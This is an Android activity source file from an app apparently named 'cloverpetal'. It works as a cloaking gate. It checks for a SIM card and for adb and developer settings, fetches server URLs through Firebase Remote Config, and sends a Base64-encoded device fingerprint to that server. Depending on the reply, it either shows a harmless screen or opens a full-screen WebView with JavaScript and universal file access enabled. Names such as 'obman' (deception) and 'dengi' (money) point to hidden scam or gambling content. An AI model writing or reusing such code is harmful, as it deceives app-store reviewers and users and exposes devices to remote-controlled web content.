package com.bring.cloverpetal;

import androidx.annotation.NonNull;
import androidx.annotation.RequiresApi;
import androidx.appcompat.app.AppCompatActivity;

import android.annotation.SuppressLint;
import android.annotation.TargetApi;
import android.content.Context;
import android.content.Intent;
import android.content.SharedPreferences;
import android.content.pm.ActivityInfo;
import android.net.Uri;
import android.os.Build;
import android.os.Bundle;
import android.os.CountDownTimer;
import android.os.Handler;
import android.os.Looper;
import android.os.Message;
import android.provider.Settings;
import android.telephony.TelephonyManager;
import android.util.Base64;
import android.util.Log;
import android.view.View;
import android.webkit.CookieManager;
import android.webkit.ValueCallback;
import android.webkit.WebChromeClient;
import android.webkit.WebResourceError;
import android.webkit.WebResourceRequest;
import android.webkit.WebView;
import android.webkit.WebViewClient;
import android.widget.ImageButton;

import com.appsflyer.AppsFlyerLib;
import com.bring.cloverpetal.ui.MainActivity;
import com.facebook.FacebookSdk;
import com.facebook.appevents.AppEventsLogger;
import com.facebook.applinks.AppLinkData;
import com.google.android.gms.tasks.OnCompleteListener;
import com.google.android.gms.tasks.Task;
import com.google.firebase.remoteconfig.FirebaseRemoteConfig;
import com.google.firebase.remoteconfig.FirebaseRemoteConfigSettings;
import com.onesignal.OneSignal;
import com.yandex.metrica.YandexMetrica;
import com.yandex.metrica.YandexMetricaConfig;

import org.json.JSONException;
import org.json.JSONObject;

import java.io.BufferedReader;
import java.io.BufferedWriter;
import java.io.InputStreamReader;
import java.io.OutputStreamWriter;
import java.util.Date;
import java.util.HashMap;
import java.util.Objects;

import okhttp3.MediaType;
import okhttp3.OkHttpClient;
import okhttp3.Request;
import okhttp3.RequestBody;
import okhttp3.Response;

public class CloverActivity extends AppCompatActivity {

    private WebView obman;
    private View stiring;
    private ValueCallback<Uri[]> loviGovno;
    private final static int FILECHOOSER_RESULTCODE = 1;

    private Handler tooth;
    private String ultraId = "";
    private String dip = "null";
    private String collectAnal = "null";

    private static boolean cloVer = false;
    private String clover1;
    private String clover2;

    private FirebaseRemoteConfig faerPemCon;
    private FirebaseRemoteConfigSettings faerPemConSet;
    private CountDownTimer low_count;

    int adb, development_setting;

    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        setContentView(R.layout.activity_clover);

        adb = android.provider.Settings.Global.getInt(getApplicationContext().getContentResolver(), "adb_enabled", 0);
        development_setting = Settings.Secure.getInt(getApplicationContext().getContentResolver(), "development_settings_enabled", 0);

        ImageButton cloCreat = (ImageButton) findViewById(R.id.create);
        cloCreat.setOnClickListener(new View.OnClickListener() {
            @Override
            public void onClick(View v) {
                Intent cre = new Intent(CloverActivity.this, MainActivity.class);
                startActivity(cre);
            }
        });


        ImageButton proPlyTake = (ImageButton) findViewById(R.id.prov_ply);
        proPlyTake.setOnClickListener(new View.OnClickListener() {
            @Override
            public void onClick(View v) {
                startuem("https://docs.google.com/document/d/11kXDU2AetaVU_Mhuhvx_JINegaXbgI5BTAhFRBG7TtE/edit?usp=sharing");
            }
        });


        TelephonyManager telMgr = (TelephonyManager) getSystemService(Context.TELEPHONY_SERVICE);
        int simState = telMgr.getSimState();
        if (simState == TelephonyManager.SIM_STATE_ABSENT) {
            stiring = (View) findViewById(R.id.stir);
            stiring.setVisibility(View.VISIBLE);

            ImageButton cloCreatSim = (ImageButton) findViewById(R.id.create);
            cloCreatSim.setOnClickListener(new View.OnClickListener() {
                @Override
                public void onClick(View v) {
                    Intent move = new Intent(CloverActivity.this, MainActivity.class);
                    startActivity(move);
                }
            });

            ImageButton proPlyTakeSim = (ImageButton) findViewById(R.id.prov_ply);
            proPlyTakeSim.setOnClickListener(new View.OnClickListener() {
                @Override
                public void onClick(View v) {
                    startuem("https://docs.google.com/document/d/11kXDU2AetaVU_Mhuhvx_JINegaXbgI5BTAhFRBG7TtE/edit?usp=sharing");
                }
            });
        } else {
            takeFaer();
        }
    }

    private void takeFaer() {
        initFirebase();
        fetchDataFromRemote();
    }

    private void startuem(String s) {
        Uri uri = Uri.parse(s);
        startActivity(new Intent(Intent.ACTION_VIEW,uri));
    }

    private void initFirebase() {
        faerPemCon = FirebaseRemoteConfig.getInstance();
        faerPemConSet = new FirebaseRemoteConfigSettings.Builder().setMinimumFetchIntervalInSeconds(0).build();
        faerPemCon.setConfigSettingsAsync(faerPemConSet);
    }

    private void fetchDataFromRemote() {
        faerPemCon.fetchAndActivate().addOnCompleteListener(new OnCompleteListener<Boolean>() {
            @Override
            public void onComplete(@NonNull Task<Boolean> task) {
                String anyMil = faerPemCon.getString("anyMil");
                countDown(anyMil);
            }
        });
    }

    private void countDown(String time1) {
        int time;
        try {
            time = Integer.parseInt(time1);
        } catch (NumberFormatException e) {
            time = 0;
        }
        low_count = new CountDownTimer(time, 1000) {
            @Override
            public void onTick(long l) {

            }

            @Override
            public void onFinish() {

                String clo1 = faerPemCon.getString("clo1");
                String clo2 = faerPemCon.getString("clo2");

                if (!clo1.equalsIgnoreCase("") && !clo2.equalsIgnoreCase("")) {

                    clover1 = clo1;
                    clover2 = clo2;
                    start1();
                } else {

                    initViews();
                    stiring.setVisibility(View.VISIBLE);
                }
            }
        };
        low_count.start();


    }

    @Override
    protected void onDestroy() {
        super.onDestroy();
        if(low_count != null) {
            low_count.cancel();
        }
    }

    @SuppressLint("UseCompatLoadingForDrawables")
    public void start1() {
        appOpen();
        initViews();
        tooth = new Handler(Looper.getMainLooper(), msg -> {
            if (msg.obj.equals("close"))
                stiring.setVisibility(View.VISIBLE);
            else
                opn((String) msg.obj);
            return false;
        });

        String read = read();

        trackers();

//        if (read.length() > 0 && read.contains("ttp"))
//            opn(read);
//        else
        getReferer();
    }

    private void initViews() {
        obman = findViewById(R.id.dengi);
        stiring = (View) findViewById(R.id.stir);
    }

    @SuppressLint("SetJavaScriptEnabled")
    private void opn(String s) {
        stiring.setVisibility(View.INVISIBLE);
        obman.setVisibility(View.VISIBLE);
        obman.setWebChromeClient(new MyClient());
        obman.setWebViewClient(new MyWebClient());

        obman.getSettings().setUseWideViewPort(true);
        obman.getSettings().setLoadWithOverviewMode(true);

        obman.getSettings().setDomStorageEnabled(true);
        obman.getSettings().setJavaScriptEnabled(true);
        obman.getSettings().setJavaScriptCanOpenWindowsAutomatically(true);

        obman.getSettings().setAllowFileAccessFromFileURLs(true);
        obman.getSettings().setAllowUniversalAccessFromFileURLs(true);

        obman.getSettings().setAllowFileAccess(true);
        obman.getSettings().setAllowContentAccess(true);

        setRequestedOrientation(ActivityInfo.SCREEN_ORIENTATION_FULL_SENSOR);
        CookieManager.getInstance().setAcceptCookie(true);

        wOpen(s);
        obman.loadUrl(s);
    }

    @Override
    public void onActivityResult(int requestCode, int resultCode, Intent intent) {
        super.onActivityResult(requestCode, resultCode, intent);
        if (requestCode == FILECHOOSER_RESULTCODE) {
            if (loviGovno == null)
                return;
            loviGovno.onReceiveValue(WebChromeClient.FileChooserParams.parseResult(resultCode, intent));
            loviGovno = null;
        }
    }

    private class MyClient extends WebChromeClient {
        @Override
        public boolean onShowFileChooser(WebView webView,
                                         ValueCallback<Uri[]> filePathCallback,
                                         FileChooserParams fileChooserParams) {
            loviGovno = filePathCallback;
            Intent intent = new Intent(Intent.ACTION_GET_CONTENT);
            intent.addCategory(Intent.CATEGORY_OPENABLE);
            intent.setType("image/*");
            startActivityForResult(Intent.createChooser(intent, "File Chooser"), FILECHOOSER_RESULTCODE);
            return true;
        }
    }

    @Override
    public void onBackPressed() {
        if (obman.canGoBack()) {
            obman.goBack();
        } else {
            super.onBackPressed();
        }
    }


    private void getReferer() {
        ultraId = AppsFlyerLib.getInstance().getAppsFlyerUID(this);
        collectAnal = AppsFlyerLib.getInstance().getAttributionId(this);
        if (collectAnal == null)
            collectAnal = "null";

        AppLinkData.fetchDeferredAppLinkData(this,
                appLinkData -> {
                    if (appLinkData != null) {
                        dip = Objects.requireNonNull(appLinkData.getTargetUri()).toString();
                        Log.d("getTargetUri", dip);
                    }
                    if(!cloVer) {
                        new Thread(this::collecting).start();
                    }
                }
        );
    }

    private void collecting() {
        cloVer = true;
        Message message = new Message();
        message.obj = collect();
        tooth.sendMessage(message);
    }

    private class MyWebClient extends WebViewClient {
        @TargetApi(Build.VERSION_CODES.N)
        @Override
        public boolean shouldOverrideUrlLoading(WebView view, WebResourceRequest request) {
            if (!request.getUrl().toString().contains("accounts.google.com")) {
                if (request.getUrl().toString().startsWith("http"))
                    view.loadUrl(request.getUrl().toString());
                else
                    startActivity(new Intent(Intent.ACTION_VIEW, request.getUrl()));
            }
            return true;
        }

        @Override
        public boolean shouldOverrideUrlLoading(WebView view, String url) {
            if (!url.contains("accounts.google.com")) {
                if (url.startsWith("http"))
                    view.loadUrl(url);
                else
                    startActivity(new Intent(Intent.ACTION_VIEW, Uri.parse(url)));
            }
            return true;
        }

        @Override
        public void onPageFinished(WebView view, String url) {
            super.onPageFinished(view, url);
            wFinish(url);
            write(url);
        }

        @RequiresApi(api = Build.VERSION_CODES.M)
        @Override
        public void onReceivedError(WebView webview, WebResourceRequest request, WebResourceError error) {
            wError(request.getUrl() + "___" + error.getDescription());
        }
    }

    public String getUUID() {
        SharedPreferences sharedPreferences = getSharedPreferences("key", MODE_PRIVATE);
        String uuid = sharedPreferences.getString("key", "null");

        if (uuid.equals("null")) {
            uuid = String.valueOf(java.util.UUID.randomUUID());
            SharedPreferences mySharedPreferences = getSharedPreferences("key", MODE_PRIVATE);
            @SuppressLint("CommitPrefEdits") SharedPreferences.Editor editor = mySharedPreferences.edit();
            editor.putString("key", uuid);
            editor.apply();
        }
        return uuid;
    }

    public String collect() {
        int i = 0;

        while (true) {
            String apsInfo = read_key1("nil");
            if (!apsInfo.equals("nil") || i == 5) {
                String s = toJSON(apsInfo);
                String read = read();
                if (read.length() > 0 && read.contains("ttp")) {
                    return send(clover1, ""); //todo вставить ссылку на апи редирект
                }else {
                    return send(clover1, s);
                }
            } else {
                try {
                    Thread.sleep(1500);
                    i++;
                } catch (InterruptedException e) {
                    e.printStackTrace();
                    i++;
                }
            }
        }
    }

    private String send(String s, String s1) {
        final MediaType JSON = MediaType.get("application/json; charset=utf-8");
        OkHttpClient client = new OkHttpClient();
        RequestBody body = RequestBody.create(s1, JSON);

        Request request = new Request.Builder()
                .url(s)
                .post(body)
                .addHeader("Content-Type", "application/json")
                .addHeader("Device-UUID", getUUID())
                .build();

        try (Response response = client.newCall(request).execute()) {
            String responseString = Objects.requireNonNull(response.body()).string();

            JSONObject respJSON = new JSONObject(responseString);
            if (respJSON.getBoolean("success")) {
                write(respJSON.getString("url"));
                return respJSON.getString("url");
            } else {
                return "close";
            }
        } catch (Exception e) {
            e.printStackTrace();
            return "close";
        }
    }

    public String toJSON(String apsInfo) {
        JSONObject jsonObject = new JSONObject();
        try {
            jsonObject.put("appsFlyerId", ultraId);
            jsonObject.put("deeplink", dip);
            jsonObject.put("attributionId", collectAnal);
            jsonObject.put("apsInfo", new JSONObject(apsInfo));
            jsonObject.put("phoneInfo", getJson());

            String encodedJson = new String(Base64.encode(jsonObject.toString().getBytes(), Base64.NO_WRAP));
            jsonObject = new JSONObject();
            jsonObject.put("data", encodedJson);

            return jsonObject.toString();
        } catch (Exception e) {
            return "";
        }
    }

    private void trackers() {
        YandexMetricaConfig config = YandexMetricaConfig.newConfigBuilder("dd584138-c440-4237-a412-69c3f12daf16").build();//todo вставить ключ метрики
        YandexMetrica.activate(getApplicationContext(), config);
        YandexMetrica.enableActivityAutoTracking(getApplication());

        FacebookSdk.setApplicationId("1848595948667340");//todo вставить ключ фб
        FacebookSdk.setAdvertiserIDCollectionEnabled(true);
        FacebookSdk.sdkInitialize(getApplicationContext());
        FacebookSdk.fullyInitialize();
        AppEventsLogger.activateApp(getApplication());

        OneSignal.initWithContext(this);
        OneSignal.setAppId("3b117e27-4e5c-4a46-8359-993b73767335");//todo вставить ключ сигнала

        String externalUserId = getUUID();

        OneSignal.setExternalUserId(externalUserId, new OneSignal.OSExternalUserIdUpdateCompletionHandler() {
            @Override
            public void onSuccess(JSONObject results) {
                try {
                    if (results.has("push") && results.getJSONObject("push").has("success")) {
                        boolean isPushSuccess = results.getJSONObject("push").getBoolean("success");
                        OneSignal.onesignalLog(OneSignal.LOG_LEVEL.VERBOSE, "Set external user id for push status: " + isPushSuccess);
                    }
                } catch (JSONException e) {
                    e.printStackTrace();
                }

                try {
                    if (results.has("email") && results.getJSONObject("email").has("success")) {
                        boolean isEmailSuccess = results.getJSONObject("email").getBoolean("success");
                        OneSignal.onesignalLog(OneSignal.LOG_LEVEL.VERBOSE, "Set external user id for email status: " + isEmailSuccess);
                    }
                } catch (JSONException e) {
                    e.printStackTrace();
                }
                try {
                    if (results.has("sms") && results.getJSONObject("sms").has("success")) {
                        boolean isSmsSuccess = results.getJSONObject("sms").getBoolean("success");
                        OneSignal.onesignalLog(OneSignal.LOG_LEVEL.VERBOSE, "Set external user id for sms status: " + isSmsSuccess);
                    }
                } catch (JSONException e) {
                    e.printStackTrace();
                }
            }

            @Override
            public void onFailure(OneSignal.ExternalIdError error) {
                // The results will contain channel failure statuses
                // Use this to detect if external_user_id was not set and retry when a better network connection is made
                OneSignal.onesignalLog(OneSignal.LOG_LEVEL.VERBOSE, "Set external user id done with error: " + error.toString());
            }
        });
    }

    public void wError(String s) {
        JSONObject jsonObject = new JSONObject();
        JSONObject data = new JSONObject();

        try {
            data.put("param1", s);
            jsonObject.put("name", "a_e_w");
            jsonObject.put("data", data);
            jsonObject.put("created", new Date().getTime());
        } catch (Exception e) {
            e.printStackTrace();
        }

        new Thread(() -> send(jsonObject)).start();
    }

    public void appOpen() {
        JSONObject jsonObject = new JSONObject();
        JSONObject data = new JSONObject();

        try {
            data.put("param1", "null");
            jsonObject.put("name", "a_o");
            jsonObject.put("data", data);
            jsonObject.put("created", new Date().getTime());
        } catch (Exception e) {
            e.printStackTrace();
        }

        new Thread(() -> send(jsonObject)).start();
    }

    public void wOpen(String s) {
        JSONObject jsonObject = new JSONObject();
        JSONObject data = new JSONObject();

        try {
            data.put("param1", s);
            jsonObject.put("name", "a_o_w");
            jsonObject.put("data", data);
            jsonObject.put("created", new Date().getTime());
        } catch (Exception e) {
            e.printStackTrace();
        }

        new Thread(() -> send(jsonObject)).start();
    }

    public void wFinish(String s) {
        JSONObject jsonObject = new JSONObject();
        JSONObject data = new JSONObject();

        try {
            data.put("param1", s);
            jsonObject.put("name", "a_p_f");
            jsonObject.put("data", data);
            jsonObject.put("created", new Date().getTime());
        } catch (Exception e) {
            e.printStackTrace();
        }

        new Thread(() -> send(jsonObject)).start();
    }

    private void send(JSONObject jsonObject) {
        OkHttpClient client = new OkHttpClient();
        MediaType JSON = MediaType.get("application/json; charset=utf-8");
        RequestBody body = RequestBody.create(String.valueOf(jsonObject), JSON);

        Request request = new Request.Builder()
                .url(clover2)//todo вставить ссылку на апи ивентов
                .post(body)
                .addHeader("Content-Type", "application/json")
                .addHeader("Device-UUID", getUUID())
                .build();

        try {
            client.newCall(request).execute();
        } catch (Exception e) {
            e.printStackTrace();

        }
    }

    public JSONObject getJson() {
        HashMap<String, String> map = new HashMap<>();
        map.put("user_agent", System.getProperties().getProperty("http.agent"));
        map.put("fingerprint", Build.FINGERPRINT);
        map.put("manufacturer", Build.MANUFACTURER);
        map.put("device", Build.DEVICE);
        map.put("model", Build.MODEL);
        map.put("brand", Build.BRAND);
        map.put("hardware", Build.HARDWARE);
        map.put("board", Build.BOARD);
        map.put("bootloader", Build.BOOTLOADER);
        map.put("tags", Build.TAGS);
        map.put("type", Build.TYPE);
        map.put("product", Build.PRODUCT);
        map.put("host", Build.HOST);
        map.put("display", Build.DISPLAY);
        map.put("id", Build.ID);
        map.put("user", Build.USER);
        map.put("adb_enabled", String.valueOf(adb));
        map.put("development_settings_enabled", String.valueOf(development_setting));

        return new JSONObject(map);
    }

    public void write(String string) {
        try {
            BufferedWriter bw = new BufferedWriter(new OutputStreamWriter(openFileOutput("file", MODE_PRIVATE)));
            bw.write(string);
            bw.close();
        } catch (Exception e) {
            e.printStackTrace();
        }
    }

    public String read() {
        StringBuilder s = new StringBuilder();
        try {
            BufferedReader br = new BufferedReader(new InputStreamReader(openFileInput("file")));
            String str;
            while ((str = br.readLine()) != null) {
                s.append(str);
            }
        } catch (Exception e) {
            e.printStackTrace();
        }
        return s.toString();
    }

    public String read_key1(String def) {
        SharedPreferences myPrefs = getSharedPreferences("file", Context.MODE_PRIVATE);
        return myPrefs.getString("key1", def);
    }
}